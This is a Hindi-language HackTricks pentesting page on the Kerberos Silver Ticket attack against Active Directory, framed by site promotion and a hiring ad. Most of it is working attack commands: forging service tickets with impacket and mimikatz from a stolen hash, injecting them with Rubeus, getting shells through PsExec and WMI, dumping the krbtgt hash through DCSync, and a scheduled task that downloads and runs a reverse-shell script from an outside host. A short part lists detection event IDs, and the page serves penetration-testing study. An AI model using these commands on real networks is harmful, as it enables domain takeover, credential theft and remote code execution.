# सिल्वर टिकट

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ हैकट्रिक्स क्लाउड ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 ट्विटर 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ ट्विच 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 यूट्यूब 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **हैकट्रिक्स में विज्ञापित करना** चाहते हैं? या क्या आपको **PEASS की नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**द पीएस फैमिली**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में **शामिल हों** या मुझे **ट्विटर** पर **फॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स को** [**हैकट्रिक्स रेपो**](https://github.com/carlospolop/hacktricks) **और** [**हैकट्रिक्स-क्लाउड रेपो**](https://github.com/carlospolop/hacktricks-cloud) **में पीआर जमा करके** अपना योगदान दें।

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

यदि आप **हैकिंग करियर** में रुचि रखते हैं और अहैकेबल को हैक करना चाहते हैं - हम नियुक्ति कर रहे हैं! (_अच्छी पोलिश लिखित और बोली जाना चाहिए_).

{% embed url="https://www.stmcyber.com/careers" %}

## सिल्वर टिकट

सिल्वर टिकट हमला **एक वैध TGS को तैयार करके सेवा के NTLM हैश को स्वामित्व में लेने** पर आधारित है (जैसे **PC खाता हैश**)। इसलिए, किसी भी उपयोगकर्ता के रूप में एक कस्टम TGS को बनाकर **उस सेवा में पहुंच** प्राप्त की जा सकती है।

इस मामले में, NTLM **कंप्यूटर खाते का हैश** (जो AD में एक प्रकार का उपयोगकर्ता खाता है) **स्वामित्व में है**। इसलिए, SMB सेवा के माध्यम से **उस मशीन में** **व्यवस्थापक** विशेषाधिकारों के साथ प्रवेश प्राप्त करने के लिए एक **टिकट** तैयार किया जा सकता है। कंप्यूटर खाते अपने पासवर्ड को 30 दिनों में रीसेट करते हैं।

इसे ध्यान में रखना चाहिए कि एक AES केरबेरोस कुंजी (AES128 और AES256) का उपयोग करके टिकट तैयार करना संभव और **वांछनीय** (ऑपसेक) है। एक AES कुंजी कैसे उत्पन्न करें जानने के लिए पढ़ें: [धारा 4.4 ऑफ़ MS-KILE](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-kile/936a4878-9462-4753-aac8-087cd3ca4625) या [Get-KerberosAESKey.ps1](https://gist.github.com/Kevin-Robertson/9e0f8bfdbf4c1e694e6ff4197f0a4372)।

{% code title="Linux" %}
```bash
python ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park -spn cifs/labwws02.jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@labwws02.jurassic.park -k -no-pass
```
{% endcode %}

Windows में, **Mimikatz** का उपयोग **टिकट** बनाने के लिए किया जा सकता है। अगले, टिकट को **Rubeus** के साथ **इंजेक्ट** किया जाता है, और अंत में **PsExec** की मदद से एक रिमोट शेल प्राप्त की जा सकती है।

{% code title="Windows" %}
```bash
#Create the ticket
mimikatz.exe "kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:b18b4b218eccad1c223306ea1916885f /user:stegosaurus /service:cifs /target:labwws02.jurassic.park"
#Inject in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt ticket.kirbi"
.\Rubeus.exe ptt /ticket:ticket.kirbi
#Obtain a shell
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd

#Example using aes key
kerberos::golden /user:Administrator /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /target:labwws02.jurassic.park /service:cifs /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /ticket:srv2-cifs.kirbi
```
{% endcode %}

सीआईएफएस सेवा वह है जिसके माध्यम से आप पीड़ित के फ़ाइल सिस्टम तक पहुंच सकते हैं। आप यहां अन्य सेवाएं भी पा सकते हैं: [https://adsecurity.org/?page\_id=183](https://adsecurity.org/?page\_id=183)। उदाहरण के लिए, आप होस्ट सेवा का उपयोग करके कंप्यूटर में एक schtask बना सकते हैं। फिर आप पीड़ित के कार्यों की सूची देखने के लिए यह जांच सकते हैं: `schtasks /S <hostname>` या आप होस्ट और RPCSS सेवा का उपयोग करके कंप्यूटर में WMI क्वेरी को निष्पादित करने के लिए यह जांच सकते हैं: `Get-WmiObject -Class win32_operatingsystem -ComputerName <hostname>`

### समाधान

Silver ticket इवेंट आईडी (golden ticket से अधिक छिपकली जैसा):

* 4624: खाता लॉगऑन
* 4634: खाता लॉगऑफ
* 4672: व्यवस्थापक लॉगऑन

[**Silver Tickets के बारे में अधिक जानकारी ired.team में**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)

## उपलब्ध सेवाएं

| सेवा प्रकार | सेवा Silver Tickets |
| -------------- | --------------------- |
| WMI            | HOST, RPCSS           |
| PowerShell Remoting | HOST, HTTP, आवश्यकतानुसार ऑपरेटिंग सिस्टम के अनुसार: WSMAN, RPCSS |
| WinRM | HOST, HTTP, कुछ मौकों पर आप सिर्फ WINRM के लिए पूछ सकते हैं |
| Scheduled Tasks | HOST |
| Windows File Share, भी psexec | CIFS |
| LDAP operations, DCSync समेत | LDAP |
| Windows Remote Server Administration Tools | RPCSS, LDAP, CIFS |
| Golden Tickets | krbtgt |

**Rubeus** का उपयोग करके आप इन सभी टिकट के लिए पूछ सकते हैं इस पैरामीटर का उपयोग करके:

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

## सेवा टिकट का दुरुपयोग

निम्नलिखित उदाहरणों में यह मान लें कि टिकट को प्रशासक खाता की अनुकरण करके प्राप्त किया जाता है।

### CIFS

इस टिकट के साथ आप **SMB** के माध्यम से `C$` और `ADMIN$` फ़ोल्डर तक पहुंच सकेंगे (यदि वे प्रकट हों) और दूरस्थ फ़ाइल सिस्टम के एक हिस्से में फ़ाइलें कॉपी कर सकेंगे, बस इस तरह कुछ करके:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
आप भी **psexec** का उपयोग करके होस्ट के अंदर एक शैल प्राप्त कर सकते हैं या विचित्र आदेशों को निष्पादित कर सकते हैं:

{% content-ref url="../ntlm/psexec-and-winexec.md" %}
[psexec-and-winexec.md](../ntlm/psexec-and-winexec.md)
{% endcontent-ref %}

### होस्ट

इस अनुमति के साथ आप दूरस्थ कंप्यूटरों में निर्धारित कार्यों को उत्पन्न कर सकते हैं और विचित्र आदेशों को निष्पादित कर सकते हैं:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

इन टिकट के साथ आप **पीड़ित सिस्टम में WMI को निष्पादित कर सकते हैं**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
विंडोज़ में winrm एक्सेस के साथ एक कंप्यूटर को आप **एक्सेस कर सकते हैं** और यहां तक ​​कि आप PowerShell भी प्राप्त कर सकते हैं:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
एक दूरस्थ होस्ट से संपर्क स्थापित करने के लिए और अधिक तरीकों के बारे में जानने के लिए निम्नलिखित पृष्ठ की जांच करें:

{% content-ref url="../ntlm/winrm.md" %}
[winrm.md](../ntlm/winrm.md)
{% endcontent-ref %}

{% hint style="warning" %}
ध्यान दें कि उसे एक्सेस करने के लिए दूरस्थ कंप्यूटर पर **winrm सक्रिय और सुन रहा** होना चाहिए।
{% endhint %}

### LDAP

इस विशेषाधिकार के साथ आप **DCSync** का उपयोग करके डीसी डेटाबेस को डंप कर सकते हैं:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**DCSync के बारे में और अधिक जानें** इस पेज पर:

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

यदि आप **हैकिंग करियर** में रुचि रखते हैं और अहैकेबल को हैक करना चाहते हैं - **हम भर्ती कर रहे हैं!** (_चटकदार पोलिश लिखित और बोली जानी चाहिए_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित करना चाहते हैं**? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या मुझे **ट्विटर** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें द्वारा PRs सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud)।

</details>
